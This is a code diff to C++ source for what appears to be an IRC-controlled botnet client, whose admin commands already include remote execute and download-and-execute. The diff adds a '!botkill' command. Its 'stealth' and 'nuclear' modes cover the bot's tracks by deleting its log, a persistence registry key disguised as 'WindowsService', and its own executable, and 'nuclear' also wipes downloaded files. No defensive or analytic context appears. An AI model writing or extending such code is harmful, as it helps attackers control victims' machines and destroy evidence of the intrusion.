@@ -163,7 +163,7 @@ public:
         if (command == "!help") {
             std::string help = "Available commands: !help, !time, !version, !status";
             if (isAdmin(sender)) {
-                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute";
+                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute, !botkill";
             }
             sendCommand("PRIVMSG " + target + " :" + help);
         }
@@ -399,6 +399,86 @@ public:
                     }
                 } else {
                     sendCommand("PRIVMSG " + target + " :Usage: !downloadandexecute <url> <filename>");
+                }
+            }
+            else if (command == "!botkill") {
+                std::string killType;
+                iss >> killType;
+                
+                log("Botkill command received: " + killType);
+                sendCommand("PRIVMSG " + target + " :Botkill initiated: " + killType);
+                
+                if (killType == "clean") {
+                    // Clean kill - just exit gracefully
+                    log("Clean botkill - exiting gracefully");
+                    sendCommand("QUIT :Clean shutdown");
+                    running = false;
+                }
+                else if (killType == "stealth") {
+                    // Stealth kill - remove traces and exit
+                    log("Stealth botkill - removing traces");
+                    
+                    // Remove log file
+                    std::string removeLogCmd = "rm -f " + logFile;
+                    system(removeLogCmd.c_str());
+                    
+                    // Remove startup registry entry (Windows)
+                    #ifdef _WIN32
+                    std::string removeRegCmd = "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsService /f";
+                    system(removeRegCmd.c_str());
+                    #endif
+                    
+                    // Remove executable file
+                    char exePath[1024];
+                    #ifdef _WIN32
+                    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
+                    #else
+                    readlink("/proc/self/exe", exePath, sizeof(exePath));
+                    #endif
+                    
+                    std::string removeExeCmd = "rm -f \"" + std::string(exePath) + "\"";
+                    system(removeExeCmd.c_str());
+                    
+                    sendCommand("QUIT :Stealth shutdown");
+                    running = false;
+                }
+                else if (killType == "nuclear") {
+                    // Nuclear kill - remove everything and crash
+                    log("Nuclear botkill - removing everything");
+                    
+                    // Remove all downloaded files
+                    system("rm -f *.txt *.sh *.exe *.bin *.cpp");
+                    
+                    // Remove log file
+                    std::string removeLogCmd = "rm -f " + logFile;
+                    system(removeLogCmd.c_str());
+                    
+                    // Remove startup registry entry (Windows)
+                    #ifdef _WIN32
+                    std::string removeRegCmd = "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsService /f";
+                    system(removeRegCmd.c_str());
+                    #endif
+                    
+                    // Remove executable file
+                    char exePath[1024];
+                    #ifdef _WIN32
+                    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
+                    #else
+                    readlink("/proc/self/exe", exePath, sizeof(exePath));
+                    #endif
+                    
+                    std::string removeExeCmd = "rm -f \"" + std::string(exePath) + "\"";
+                    system(removeExeCmd.c_str());
+                    
+                    sendCommand("QUIT :Nuclear shutdown");
+                    running = false;
+                }
+                else {
+                    // Default kill - just exit
+                    log("Default botkill - exiting");
+                    sendCommand("PRIVMSG " + target + " :Usage: !botkill [clean|stealth|nuclear]");
+                    sendCommand("QUIT :Botkill shutdown");
+                    running = false;
                 }
             }
         }
